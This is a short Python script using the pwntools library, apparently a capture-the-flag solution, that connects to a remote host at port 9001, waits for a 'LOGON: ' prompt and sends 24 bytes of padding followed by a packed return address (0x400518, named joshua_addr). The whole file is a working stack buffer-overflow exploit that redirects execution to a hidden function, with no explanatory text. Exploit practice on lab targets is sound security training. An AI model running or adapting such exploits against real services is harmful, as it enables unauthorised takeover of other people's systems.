from pwn import *

host = "134.122.5.152"
port = 9001
p = remote(host, port)

p.recvuntil(b"LOGON: ")

padding = b"A"*24
joshua_addr = 0x400518
payload = padding + p64(joshua_addr)
p.sendline(payload)

print(p.recvall(timeout=5).decode(errors='ignore'))
p.close()
